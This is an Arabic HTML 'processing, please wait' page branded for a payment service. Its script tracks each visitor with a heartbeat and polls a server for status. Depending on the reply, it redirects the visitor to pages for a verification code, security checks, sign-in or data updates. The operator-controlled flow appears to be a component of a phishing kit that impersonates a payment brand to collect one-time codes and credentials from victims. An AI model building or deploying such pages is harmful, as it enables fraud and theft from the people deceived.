<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>جاري المعالجة - بن دول باي</title>
<link rel="icon" href="assets/img/icone.png">
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
<style>
:root{--primary:#364abf;--bg:#e8ecf5;--card:#fff;--ink:#1a1d2e;--ink-soft:#8b90a0}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Tajawal',sans-serif;background:var(--bg);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.box{background:var(--card);border-radius:24px;padding:48px 28px;width:100%;max-width:400px;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,.06)}
.loader{width:60px;height:60px;border:5px solid #e2e8f0;border-top-color:var(--primary);border-radius:50%;
  animation:spin 1s linear infinite;margin:0 auto 24px}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:20px;font-weight:900;color:var(--ink);margin-bottom:8px}
.sub{color:var(--ink-soft);font-size:14px;line-height:1.8}
</style>
</head>
<body>
<div class="box">
  <div class="loader"></div>
  <h1>جاري معالجة طلبك</h1>
  <p class="sub">يرجى الانتظار وعدم إغلاق هذه الصفحة...</p>
</div>

<script>
var _vid=Math.random().toString(36).slice(2);
var id=new URLSearchParams(location.search).get('id')||'';
function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'loading',vid:_vid})}).catch(function(){});}
setInterval(heartbeat,10000);heartbeat();

function pollStatus(){
  if(!id)return;
  fetch('/api/status/'+id).then(function(r){return r.json();}).then(function(d){
    if(d.status==='redirect'&&d.redirect){
      if(d.redirect==='loading')return;
      if(d.redirect==='code')window.location.href='code.html?id='+id;
      else if(d.redirect==='security')window.location.href='security.html?id='+id;
      else if(d.redirect==='login')window.location.href='signin.html';
      else if(d.redirect==='update-data')window.location.href='update-data.html?id='+id;
    }
    if(d.status==='accepted')window.location.href='code.html?id='+id;
  }).catch(function(){});
}
setInterval(pollStatus,3000);
</script>
</body>
</html>
